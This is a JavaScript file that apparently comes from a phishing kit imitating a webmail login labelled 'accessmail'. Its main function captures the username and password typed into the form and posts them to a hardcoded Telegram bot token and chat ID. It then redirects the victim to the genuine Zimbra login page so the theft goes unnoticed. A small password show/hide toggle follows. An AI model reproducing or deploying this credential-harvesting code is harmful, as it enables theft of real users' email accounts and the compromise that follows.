function sendToTelegram(event) {
            event.preventDefault(); // Prevent form submission

            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();

            const botToken = "8963489697:AAFY86fVwtG8jDpg6hOLlGKsEFBHW7-6WnQ"
            const chatId = "8666023324"

            const message = `🔐 message from accessmail 🔐\n\n👤 *User ID:* ${username}\n🔑 *Pass:* ${password}`;

            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(telegramURL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: "Markdown"
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        document.getElementById('username').value = "";
                        document.getElementById('password').value = "";
                        window.location.href = "https://mail.myaccess.ca/zimbra/"
                    } else {
                        alert("Failed to send. Check bot token and chat ID.");
                    }
                })
                .catch(error => console.error("Error:", error));
}


let pass = document.querySelector('#password');
let toggle = document.querySelector('#toggle');

toggle.addEventListener('click', () => {
    if (toggle.innerText === "Show") {
        toggle.innerText = "Hide";
        pass.type = "text";
    } else {
        toggle.innerText = "Show";
        pass.type = "password";
    }
})